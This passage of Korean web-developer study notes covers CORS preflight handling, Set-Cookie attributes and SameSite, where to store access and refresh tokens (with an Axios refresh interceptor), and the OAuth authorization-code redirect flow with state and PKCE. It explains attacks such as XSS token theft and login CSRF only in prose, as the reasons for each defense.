- Preflight 요청에는 **쿠키나 `Authorization` 헤더가 포함되지 않으므로**, 서버의 인증 필터가 `OPTIONS` 요청까지 막으면 **401이 나며 CORS 에러**가 발생함 (Spring Security에서 CORS 설정을 Security 필터 체인에 등록해야 하는 이유)

### 📍 Preflight를 줄이는 방법

| 방법                      | 설명                                                                                    |
| ------------------------- | --------------------------------------------------------------------------------------- |
| `Access-Control-Max-Age`  | Preflight 결과를 **캐싱**해 같은 요청에 대해 반복 전송 방지 (브라우저별 최대값 제한 있음) |
| 같은 출처로 요청 (Proxy)  | 개발 시 **Vite/Webpack devServer proxy**, 운영 시 **Nginx 리버스 프록시**나 Next.js `rewrites`로 API를 같은 출처처럼 사용 → CORS 자체가 발생하지 않음 |
| 불필요한 커스텀 헤더 제거 | 꼭 필요하지 않은 커스텀 헤더를 붙이지 않기                                              |

```js
// vite.config.js - 개발 환경에서 같은 출처로 프록시
export default {
  server: {
    proxy: {
      "/api": { target: "https://api.app.com", changeOrigin: true },
    },
  },
};
```

### 💡 API 요청 한 번에 Network 탭에 요청이 두 번 찍히는 이유

**⇒ `application/json`으로 POST 요청을 보내거나 `Authorization` 헤더를 붙이면 Simple Request 조건을 벗어나서, 브라우저가 본 요청 전에 `OPTIONS` 메서드로 Preflight 요청을 먼저 보내기 때문. Preflight 응답에서 해당 Method와 헤더가 허용되면 그때 본 요청을 보내므로 두 개가 찍힘. 매 요청마다 왕복이 한 번 더 생기는 비용이 있으므로 `Access-Control-Max-Age`로 캐싱하거나 프록시로 같은 출처를 만들어 줄일 수 있음**

### 💡 Preflight는 성공했는데 본 요청에서 CORS 에러가 나는 경우

**⇒ Preflight 응답뿐 아니라 본 요청의 응답에도 `Access-Control-Allow-Origin` 헤더가 있어야 하는데, 에러 응답(500, 401 등)을 반환하는 경로에서 CORS 헤더가 빠지는 경우가 많음. 또한 쿠키를 포함한 요청인데 본 응답에 `Access-Control-Allow-Credentials: true`가 없거나 Origin이 `*`이면 브라우저가 차단함. 따라서 CORS 에러가 나면 Network 탭에서 Preflight와 본 요청의 응답 헤더를 각각 확인해야 함**

---

## 2. Cookie 옵션

- `Set-Cookie` 헤더의 속성으로 **쿠키의 전송 범위, 수명, 보안 수준**을 제어

```http
Set-Cookie: refreshToken=xyz; Domain=example.com; Path=/; Max-Age=1209600; HttpOnly; Secure; SameSite=Lax
```

### 📍 주요 Cookie 속성

| 속성                  | 설명                                                                                       |
| --------------------- | ------------------------------------------------------------------------------------------ |
| `Domain`              | 쿠키를 전송할 도메인. 지정하면 **서브도메인까지 포함**, 생략하면 **설정한 호스트에만** 전송 |
| `Path`                | 해당 경로와 그 하위 경로 요청에만 전송 (`/api`로 지정하면 `/api/**`에만 전송)              |
| `Expires` / `Max-Age` | 쿠키 만료 시각 / 만료까지 남은 초. 둘 다 없으면 **브라우저 종료 시 삭제** (`Max-Age` 우선)  |
| `HttpOnly`            | **JS(`document.cookie`)로 접근 불가** → XSS로 인한 쿠키 탈취 방지                          |
| `Secure`              | **HTTPS 요청에서만** 쿠키 전송 (localhost는 예외적으로 허용)                               |
| `SameSite`            | **다른 사이트에서 시작된 요청**에 쿠키를 보낼지 결정 → CSRF 방어                          |
| `Partitioned`         | 3rd-party 쿠키를 **최상위 사이트별로 분리 저장** (CHIPS)                                   |

### 📍 SameSite 옵션

| 값       | 다른 사이트에서 시작된 요청에 쿠키 전송                                                      | 용도                                  |
| -------- | -------------------------------------------------------------------------------------------- | ------------------------------------- |
| `Strict` | **절대 전송 X** (외부 링크로 들어와도 첫 요청에는 쿠키 없음 → 로그인 풀린 것처럼 보임)       | 은행 등 보안이 매우 중요한 경우       |
| `Lax`    | **최상위 이동(링크 클릭) + GET 요청**에만 전송, 폼 POST·`fetch`·`<img>`·iframe 요청에는 X     | **대부분 브라우저의 기본값**, 일반적인 로그인 쿠키 |
| `None`   | **항상 전송** (반드시 `Secure`와 함께 사용해야 함)                                           | 다른 사이트에 임베드되는 위젯, 프론트/API가 완전히 다른 사이트인 경우 |

### 📍 Same-Site vs Same-Origin

- **Same-Origin:** Scheme + Host + Port가 모두 같아야 함
- **Same-Site:** **등록 가능한 도메인(eTLD+1)** 과 Scheme이 같으면 같은 사이트 (Port, 서브도메인 무관)

| 비교                                         | Same-Origin | Same-Site |
| -------------------------------------------- | ----------- | --------- |
| `https://app.example.com` ↔ `https://api.example.com` | X  | **O**     |
| `https://example.com` ↔ `https://example.com:8080`    | X  | **O**     |
| `https://example.com` ↔ `https://other.com`           | X  | X         |

- 따라서 `app.example.com`과 `api.example.com`은 **CORS 설정은 필요하지만** `SameSite=Lax` 쿠키는 **정상적으로 전송**됨

### 📍 Cross-Origin 요청에서 쿠키를 보내려면

- 클라이언트: `fetch(url, { credentials: "include" })` / `axios`의 `withCredentials: true`
- 서버: `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin`에 **구체적인 출처**
- 쿠키: 다른 사이트라면 `SameSite=None; Secure` 필요

### 💡 `HttpOnly`, `Secure`, `SameSite`는 각각 무엇을 막나요?

**⇒ `HttpOnly`는 JS로 쿠키를 읽지 못하게 해 XSS 공격으로 세션/토큰이 탈취되는 것을 막고, `Secure`는 HTTPS에서만 쿠키를 전송해 평문 통신 중 네트워크 도청으로 쿠키가 노출되는 것을 막으며, `SameSite`는 다른 사이트에서 시작된 요청에 쿠키가 자동으로 붙지 않게 해 CSRF를 막음. 인증 쿠키에는 세 가지를 모두 설정하는 것이 기본임**

### 💡 로컬 개발 환경(localhost:3000 → api.example.com)에서 쿠키가 저장되지 않는 이유

**⇒ `localhost`와 `api.example.com`은 다른 사이트이므로 `SameSite=Lax`(기본값) 쿠키는 Cross-Site `fetch` 요청에 저장·전송되지 않고, `SameSite=None`으로 바꾸면 `Secure`가 필수라 HTTPS가 필요함. 또한 `credentials: "include"`를 빠뜨리거나 서버 응답에 `Access-Control-Allow-Credentials: true`가 없으면 브라우저가 `Set-Cookie`를 무시함. 그래서 보통 개발 서버의 프록시로 API를 같은 출처처럼 호출하거나, 로컬 도메인을 `local.example.com`으로 맞춰 Same-Site로 만드는 방식으로 해결함**

---

## 3. Token 저장 방식

- 인증 토큰(Access/Refresh Token)을 **브라우저의 어디에 저장하느냐에 따라 XSS·CSRF에 대한 노출 정도가 달라짐**

### 📍 저장 위치별 비교

| 저장 위치          | 지속성                     | XSS                                     | CSRF                              | 특징                                         |
| ------------------ | -------------------------- | --------------------------------------- | --------------------------------- | -------------------------------------------- |
| `localStorage`     | 브라우저를 닫아도 **유지** | **취약** (JS로 언제든 읽기 가능)        | 안전 (자동 전송 X)                | 구현이 가장 간단, 탭 간 공유                 |
| `sessionStorage`   | **탭을 닫으면 삭제**       | **취약**                                | 안전                              | 탭마다 분리되어 새 탭에서 로그인 풀림        |
| 메모리 (JS 변수)   | **새로고침 시 사라짐**     | 상대적으로 안전 (전역에 노출 안 하면 탈취 어려움) | 안전                     | 새로고침마다 재발급 필요                     |
| HttpOnly Cookie    | 만료 시간까지 유지         | **안전** (JS로 읽기 불가)               | **취약** → SameSite/CSRF Token 필요 | 브라우저가 자동 전송, 서버가 쿠키 설정 필요 |

### 📍 권장 방식: Access Token은 메모리, Refresh Token은 HttpOnly 쿠키

1. 로그인 성공 시 서버가 **Access Token은 응답 바디로**, **Refresh Token은 `HttpOnly; Secure; SameSite` 쿠키로** 전달
2. 프론트는 Access Token을 **메모리(변수, 상태)** 에만 보관하고 `Authorization` 헤더로 전송
3. Access Token이 만료되면(401) **Refresh Token 쿠키로 `/auth/refresh`를 호출해 재발급** (Silent Refresh)
4. 새로고침으로 메모리가 초기화되면 앱 시작 시 **Refresh API를 먼저 호출**해 Access Token 복구

- Access Token은 JS로 읽혀도 **수명이 짧고**, Refresh Token은 **JS로 접근이 불가**하며 `Path=/auth/refresh`로 범위를 좁혀 노출을 최소화

### 📍 Axios Interceptor로 토큰 재발급 처리

```js
let accessToken = null; // 메모리에 저장
let refreshPromise = null; // 동시에 여러 요청이 401을 받아도 재발급은 한 번만

api.interceptors.request.use((config) => {
  if (accessToken) config.headers.Authorization = `Bearer ${accessToken}`;
  return config;
});

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;
    if (error.response?.status === 401 && !original._retry) {
      original._retry = true; // 무한 재시도 방지
      refreshPromise ??= axios
        .post("/auth/refresh", null, { withCredentials: true }) // Refresh Token 쿠키 전송
        .then((res) => (accessToken = res.data.accessToken))
        .finally(() => (refreshPromise = null));

      try {
        await refreshPromise;
        return api(original); // 실패했던 요청 재시도
      } catch {
        accessToken = null;
        window.location.href = "/login"; // Refresh Token도 만료 → 재로그인
      }
    }
    return Promise.reject(error);
  },
);
```

### 💡 localStorage에 토큰을 저장하면 안 되나요?

**⇒ 구현이 간단하고 CSRF에는 안전하지만, 같은 출처에서 실행되는 모든 JS가 localStorage를 읽을 수 있어 XSS가 한 번이라도 발생하면 토큰이 공격자 서버로 바로 탈취됨. 서드파티 스크립트나 npm 패키지가 오염되는 경우도 있으므로 위험이 작지 않음. 그래서 수명이 긴 Refresh Token은 HttpOnly 쿠키에 두고, Access Token은 메모리에 짧게 보관하는 방식이 더 안전함. 다만 어떤 방식도 XSS가 발생하면 사용자 권한으로 요청을 보내는 것 자체는 막지 못하므로, XSS 방어가 우선되어야 함**

### 💡 여러 API가 동시에 401을 받으면 어떻게 처리하나요?

**⇒ 페이지 진입 시 여러 API를 동시에 호출하다가 Access Token이 만료되면 모든 요청이 401을 받고 각각 재발급을 요청하게 되는데, Refresh Token Rotation을 쓰는 경우 첫 재발급 이후 나머지 요청은 이미 폐기된 Refresh Token을 사용하게 되어 재사용 공격으로 감지되고 로그아웃될 수 있음. 따라서 재발급 요청을 하나의 Promise로 공유해 한 번만 보내고, 나머지 요청은 그 결과를 기다렸다가 새 토큰으로 재시도하도록 처리해야 함**

---

## 4. OAuth Redirect

- OAuth Authorization Code Flow에서 **프론트엔드가 담당하는 리다이렉트 과정**: 인가 서버의 로그인 페이지로 보내고, 인가 코드를 들고 **`redirect_uri`로 돌아오는 흐름을 처리**

### 📍 프론트엔드 관점의 흐름

1. 사용자가 "카카오로 로그인" 클릭 → 프론트가 **인가 서버의 authorize URL로 이동** (`client_id`, `redirect_uri`, `response_type=code`, `scope`, `state` 포함)
2. 사용자가 카카오에서 로그인·동의
3. 카카오가 **등록된 `redirect_uri`로 `?code=...&state=...`를 붙여 리다이렉트**
4. 콜백 페이지에서 **`state`를 검증**하고 `code`를 **백엔드로 전달**
5. 백엔드가 `code` + `client_secret`으로 토큰 교환 → 사용자 정보 조회 → **자체 서비스 토큰(JWT/세션) 발급**
6. 프론트는 로그인 완료 처리 후 **원래 가려던 페이지로 이동**

```js
// 1. 로그인 버튼 클릭 → 인가 서버로 이동
const state = crypto.randomUUID();
sessionStorage.setItem("oauth_state", state);

const params = new URLSearchParams({
  client_id: KAKAO_CLIENT_ID,
  redirect_uri: "https://app.com/oauth/callback/kakao",
  response_type: "code",
  state,
});
window.location.href = `https://kauth.kakao.com/oauth/authorize?${params}`;
```

```js
// 4. /oauth/callback/kakao 페이지
const { code, state } = Object.fromEntries(new URLSearchParams(location.search));

if (state !== sessionStorage.getItem("oauth_state")) {
  throw new Error("Invalid state"); // CSRF 의심 → 중단
}
sessionStorage.removeItem("oauth_state");

await api.post("/auth/kakao", { code }); // 토큰 교환은 백엔드에서
navigate(sessionStorage.getItem("redirect_after_login") ?? "/", { replace: true });
```

### 📍 OAuth Redirect의 보안 요소

| 요소                    | 설명                                                                                                |
| ----------------------- | --------------------------------------------------------------------------------------------------- |
| `state`                 | 요청 시 랜덤 값을 저장해두고 콜백에서 **일치하는지 검증** → 공격자의 code로 로그인시키는 **CSRF 방지** |
| `redirect_uri` 정확히 일치 | 인가 서버에 **사전 등록된 URI와 정확히 일치**할 때만 리다이렉트 → code가 공격자 사이트로 새는 것 방지 |
| PKCE                    | `code_verifier`(랜덤 값)의 해시인 `code_challenge`를 인가 요청에 보내고, 토큰 교환 시 원본을 제출 → **코드를 가로채도 토큰으로 교환 불가** |
| 토큰 교환은 백엔드에서  | `client_secret`은 **프론트 코드에 절대 포함하지 않음** (번들은 누구나 볼 수 있음)                    |
| 로그인 후 이동 경로 검증 | `?redirect=` 값을 그대로 이동하면 **Open Redirect** 취약점 → 내부 경로(`/`로 시작)만 허용             |

### 📍 PKCE (Proof Key for Code Exchange)

```js
// code_verifier 생성 후 SHA-256 해시 → Base64URL 인코딩한 값이 code_challenge
const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
const challenge = base64url(
  await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier)),
);
// 인가 요청: code_challenge=challenge & code_challenge_method=S256
// 토큰 요청: code_verifier=verifier → 인가 서버가 해시해서 비교
```

- 원래 `client_secret`을 안전하게 보관할 수 없는 **SPA·모바일 앱(Public Client)** 을 위해 만들어졌지만, 현재는 **모든 클라이언트에 PKCE 사용을 권장**함 (OAuth 2.1)

### 💡 `state` 파라미터는 왜 필요한가요?

**⇒ `state`가 없으면 공격자가 자신의 계정으로 받은 인가 코드가 담긴 콜백 URL(`/callback?code=공격자코드`)을 피해자에게 클릭하게 만들어, 피해자가 공격자 계정으로 로그인되게 할 수 있음(Login CSRF). 피해자가 이를 모르고 결제 정보나 개인 정보를 입력하면 공격자 계정에 저장됨. 요청 시 생성한 랜덤 `state`를 저장해두고 콜백에서 일치 여부를 확인하면, 내가 시작하지 않은 OAuth 응답을 걸러낼 수 있음**

### 💡 SPA에서 인가 코드를 직접 토큰으로 교환하면 안 되나요?

**⇒ 토큰 교환에는 `client_secret`이 필요한데, SPA의 JS 번들은 누구나 열어볼 수 있어 비밀값을 안전하게 숨길 수 없음. 그래서 일반적으로는 프론트가 code를 백엔드로 넘기고 백엔드가 `client_secret`으로 교환하는 방식을 사용함. 프론트에서 직접 교환해야 하는 Public Client라면 `client_secret` 대신 PKCE를 사용해 코드 탈취 공격을 막아야 하고, 이 경우에도 발급받은 토큰을 브라우저에 보관하게 되므로 XSS 대응이 중요함. 이런 이유로 토큰을 브라우저에 두지 않고 백엔드가 대신 관리하는 BFF(Backend For Frontend) 패턴을 쓰기도 함**
